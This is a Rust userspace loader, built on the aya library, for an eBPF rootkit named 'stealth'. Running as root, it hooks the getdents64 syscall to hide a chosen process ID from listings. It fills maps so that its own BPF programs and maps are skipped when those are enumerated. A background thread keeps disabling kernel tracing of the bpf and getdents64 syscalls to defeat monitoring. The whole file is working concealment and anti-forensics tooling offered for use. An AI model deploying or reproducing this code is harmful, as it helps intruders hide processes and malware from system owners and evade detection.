use std::{thread, time::Duration};

use aya::{
    maps::{Array, HashMap, Queue},
    EbpfLoader, Pod,
};
use clap::Parser;
use log::{debug, info, warn};
use stealth::utils::{
    fetch_pids_map_ids, list_active_maps, list_active_programs, write_to_tracefs, Builder,
    SyscallTracepoint,
};
use tokio::signal;

#[derive(Debug, Parser)]
struct Opt {
    #[clap(long, required = true)]
    pid: String,
}
const MAX_PID_LENGTH: usize = 10; //KEEP IT LOW AS bpf_loop can end the loop unexpectedly otherwise

#[repr(C)]
#[derive(Copy, Clone)]
pub struct HiddenPid {
    bytes: [u8; MAX_PID_LENGTH],
    len: usize,
}
impl HiddenPid {
    fn new(str_repr: &str) -> Self {
        let mut bytes = [0u8; MAX_PID_LENGTH];
        let len = str_repr.len().min(MAX_PID_LENGTH);
        bytes[..len].copy_from_slice(str_repr.as_bytes());
        Self { bytes, len }
    }
}
#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct QueuedDirent {
    pub idx: u32,
    pub bpos: u64,
    pub d_reclen: u16,
    pub d_type: u8,
    pub d_name: [u8; 10],
}
unsafe impl Pod for QueuedDirent {}
unsafe impl Pod for HiddenPid {}
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let Opt { pid } = Opt::parse();
    env_logger::init();

    if unsafe { libc::geteuid() } != 0 {
        eprintln!("This program must be run as root");
        std::process::exit(1);
    }

    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    let tracepoints = vec![
        //SyscallTracepoint::from(("stealth_bpf", "sys_enter_bpf")),
        SyscallTracepoint::from(("stealth_pid_enter", "sys_enter_getdents64")),
        SyscallTracepoint::from(("stealth_pid_exit", "sys_exit_getdents64")),
    ];

    info!("hide pid: {}", pid);

    let mut ebpf = EbpfLoader::new().load(aya::include_bytes_aligned!(
        "../../target/bpfel-unknown-none/release/stealth"
    ))?;
    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        warn!("failed to initialize eBPF logger: {}", e);
    }
    let mut builder = Builder {
        ebpf: &mut ebpf,
        tracepoints,
    };

    let progs_info = builder.build()?;

    let bpf_info = fetch_pids_map_ids(progs_info)?;

    // set hidden pids map
    let mut hidden_pids_array: Array<_, HiddenPid> =
        Array::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
    hidden_pids_array.set(0, HiddenPid::new(&pid), 0).unwrap();

    //setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
    let mut hidden_obj_map: HashMap<_, u32, [u32; 32]> =
        HashMap::try_from(ebpf.take_map("HIDDEN_BPF_OBJ").unwrap()).unwrap();
    let mut hidden_progs = [0u32; 32];
    for (idx, m) in bpf_info.prog_ids.iter().enumerate() {
        hidden_progs[idx] = *m
    }

    let mut hidden_maps = [0u32; 32];
    for (idx, m) in bpf_info.map_ids.iter().enumerate() {
        hidden_maps[idx] = *m
    }

    hidden_obj_map.insert(0, hidden_progs, 0).unwrap();
    hidden_obj_map.insert(1, hidden_maps, 0).unwrap();

    //setup skip MAPS
    let mut prog_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
    let mut map_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();
    let prog_ids = bpf_info.prog_ids;
    let map_ids = bpf_info.map_ids;

    for p in prog_ids.clone() {
        info!("hide bpf prog: {}", p)
    }
    for m in map_ids.clone() {
        info!("hide bpf map: {}", m)
    }
    thread::spawn({
        move || loop {
            thread::sleep(Duration::from_millis(1000));
            let mut prev_id: u32 = 0;
            let active_programs = list_active_programs();
            let n_active_maps = active_programs.len();
            for (idx, m) in active_programs.iter().enumerate() {
                for to_skip_prog in prog_ids.iter() {
                    if m == to_skip_prog {
                        let to_insert_prog_id: u32 = match idx < n_active_maps {
                            true => {
                                let mut id = *to_skip_prog;
                                for next_id in active_programs.as_slice()[idx..].iter() {
                                    if !prog_ids.contains(next_id) {
                                        id = *next_id;
                                        break;
                                    }
                                }
                                id
                            }
                            false => *to_skip_prog,
                        };
                        prog_skip_map.insert(prev_id, to_insert_prog_id, 0).unwrap();
                        break;
                    }
                }
                prev_id = *m;
            }

            let mut prev_id: u32 = 0;
            let active_maps = list_active_maps();
            let n_active_maps = active_maps.len();
            for (idx, m) in active_maps.iter().enumerate() {
                for to_skip_map in map_ids.iter() {
                    if m == to_skip_map {
                        let to_insert_map_id: u32 = match idx < n_active_maps {
                            true => {
                                let mut id = *to_skip_map;
                                for next_id in active_maps.as_slice()[idx..].iter() {
                                    if !map_ids.contains(next_id) {
                                        id = *next_id;
                                        break;
                                    }
                                }
                                id
                            }
                            false => *to_skip_map,
                        };

                        map_skip_map.insert(prev_id, to_insert_map_id, 0).unwrap();
                        break;
                    }
                }
                prev_id = *m;
            }
        }
    });

    //discourage tracing
    thread::spawn({
        move || loop {
            thread::sleep(Duration::from_millis(250));
            for syscall in ["bpf", "getdents64"] {
                for hook in ["enter", "exit"] {
                    if let Err(err) = write_to_tracefs(
                        "0",
                        &format!(
                            "/sys/kernel/debug/tracing/events/syscalls/sys_{}_{}/enable",
                            hook, syscall
                        ),
                    ) {
                        println!("error: {}", err);
                    };
                }
            }
        }
    });
    let ctrl_c = signal::ctrl_c();
    println!("Waiting for Ctrl-C...");
    ctrl_c.await?;
    let mut parsed: Queue<_, QueuedDirent> =
        Queue::try_from(ebpf.take_map("PARSED").unwrap()).unwrap();
    let mut ctr = 0;
    while let Ok(k) = parsed.pop(0) {
        // let last_byte = {
        //     let mut lbyte = 0;
        //     for (idx, &b) in k.iter().rev().enumerate() {
        //         if b != 0 {
        //             lbyte = k.len().saturating_sub(1 + idx);
        //             break;
        //         };
        //     }
        //     lbyte
        // };
        // info!(
        //     "{} last byte={}={}",
        //     unsafe { std::str::from_utf8_unchecked(&k) },
        //     k[last_byte],
        //     unsafe { std::str::from_utf8_unchecked(&k[last_byte..]) }
        // );
        info!("{:#?} {}", k, unsafe {
            std::str::from_utf8_unchecked(&k.d_name)
        });
        ctr += 1;
    }
    println!("Exiting...");
    info!("{} pid parsed", ctr);
    Ok(())
}
